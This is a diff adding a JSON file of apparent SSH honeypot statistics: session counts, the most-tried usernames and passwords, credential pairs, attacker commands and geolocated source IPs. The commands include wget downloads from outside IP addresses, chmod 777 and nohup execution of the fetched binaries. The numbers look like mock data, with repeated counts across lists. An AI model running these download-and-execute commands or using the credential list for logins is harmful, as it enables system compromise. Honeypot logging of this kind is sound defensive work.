@@ -1,0 +1,241 @@
+{
+  "ssh_attacks": {
+    "probing_ip": "5000",
+    "sessions": "200",
+    "success": "456",
+    "usernames": "345",
+    "passwords": "2354",
+    "inputs": "987",
+    "downloads": "654"
+  },
+  "usernames": [
+    {
+      "hits": "38564",
+      "username": "root"
+    },
+    {
+      "hits": "3528",
+      "username": "admin"
+    },
+    {
+      "hits": "1145",
+      "username": "oracle"
+    },
+    {
+      "hits": "949",
+      "username": "ubnt"
+    },
+    {
+      "hits": "733",
+      "username": "git"
+    },
+    {
+      "hits": "552",
+      "username": "test"
+    },
+    {
+      "hits": "422",
+      "username": "ts3"
+    },
+    {
+      "hits": "389",
+      "username": "ftpuser"
+    },
+    {
+      "hits": "386",
+      "username": "postgres"
+    },
+    {
+      "hits": "382",
+      "username": "nagios"
+    }
+  ],
+  "passwords": [
+    {
+      "hits": "2411",
+      "passwords": "123456"
+    },
+    {
+      "hits": "1374",
+      "passwords": "admin"
+    },
+    {
+      "hits": "1351",
+      "passwords": "root"
+    },
+    {
+      "hits": "1200",
+      "passwords": "password"
+    },
+    {
+      "hits": "983",
+      "passwords": "ubnt"
+    },
+    {
+      "hits": "621",
+      "passwords": "vagrant"
+    },
+    {
+      "hits": "620",
+      "passwords": "1234"
+    },
+    {
+      "hits": "542",
+      "passwords": "test"
+    },
+    {
+      "hits": "528",
+      "passwords": "12345"
+    },
+    {
+      "hits": "498",
+      "passwords": "raspberry"
+    }
+  ],"username_password": [
+    {
+      "hits": "38564",
+      "username": "root",
+      "passwords": "123456"
+    },
+    {
+      "hits": "3528",
+      "username": "admin",
+      "passwords": "123456"
+    },
+    {
+      "hits": "1145",
+      "username": "oracle",
+      "passwords": "root"
+
+    },
+    {
+      "hits": "949",
+      "username": "ubnt",
+      "passwords": "password"
+    },
+    {
+      "hits": "733",
+      "username": "git",
+      "passwords": "ubuntu"
+    },
+    {
+      "hits": "552",
+      "username": "test",
+      "passwords": "123456"
+    },
+    {
+      "hits": "422",
+      "username": "user",
+      "passwords": "user"
+    },
+    {
+      "hits": "389",
+      "username": "ftpuser",
+      "passwords": "123456"
+    },
+    {
+      "hits": "386",
+      "username": "postgres",
+      "passwords": "database"
+    },
+    {
+      "hits": "382",
+      "username": "nagios",
+      "passwords": "resberry"
+    }
+  ],
+  "inputs": [
+    {
+      "hits": "2411",
+      "input": "w"
+    },
+    {
+      "hits": "1374",
+      "input": "cd /home"
+    },
+    {
+      "hits": "1351",
+      "input": "ls -la"
+    },
+    {
+      "hits": "1200",
+      "input": "cd richard/"
+    },
+    {
+      "hits": "983",
+      "input": "ls -la"
+    },
+    {
+      "hits": "621",
+      "input": "wget  http://222.186.21.103:10086/ddd1b"
+    },
+    {
+      "hits": "620",
+      "input": "./ddd1b & wget -O http://61.174.49.51:10068/Sca1"
+    },
+    {
+      "hits": "542",
+      "input": "nohup /tmp/Sca1 > /dev/null 2>&1 &"
+    },
+    {
+      "hits": "528",
+      "input": "chmod 777 Sca1"
+    },
+    {
+      "hits": "498",
+      "input": "wget http://61.174.49.51:10068/arrm1"
+    }
+  ],
+  "countryip": [
+    {
+      "remote_host": "184.106.144.135",
+      "latitude": "29.48889923095703",
+      "longitude": "-98.39869689941406"
+    },
+    {
+      "remote_host": "119.9.90.78",
+      "latitude": "22.283300399780273",
+      "longitude": "114.1500015258789"
+    },
+    {
+      "remote_host": "178.45.161.150",
+      "latitude": "53.18349838256836",
+      "longitude": "50.11819839477539"
+    },
+    {
+      "remote_host": "88.200.232.143",
+      "latitude": "55.75",
+      "longitude": "37.616600036621094"
+    },
+    {
+      "remote_host": "220.142.5.180",
+      "latitude": "25.039199829101562",
+      "longitude": "121.5250015258789"
+    },
+    {
+      "remote_host": "220.142.0.91",
+      "latitude": "25.039199829101562",
+      "longitude": "121.5250015258789"
+    },
+    {
+      "remote_host": "178.45.161.150",
+      "latitude": "53.18349838256836",
+      "longitude": "50.11819839477539"
+    },
+    {
+      "remote_host": "88.200.232.143",
+      "latitude": "55.75",
+      "longitude": "37.616600036621094"
+    },
+    {
+      "remote_host": "220.142.5.180",
+      "latitude": "25.039199829101562",
+      "longitude": "121.5250015258789"
+    },
+    {
+      "remote_host": "220.142.0.91",
+      "latitude": "25.039199829101562",
+      "longitude": "121.5250015258789"
+    }
+  ],
+}
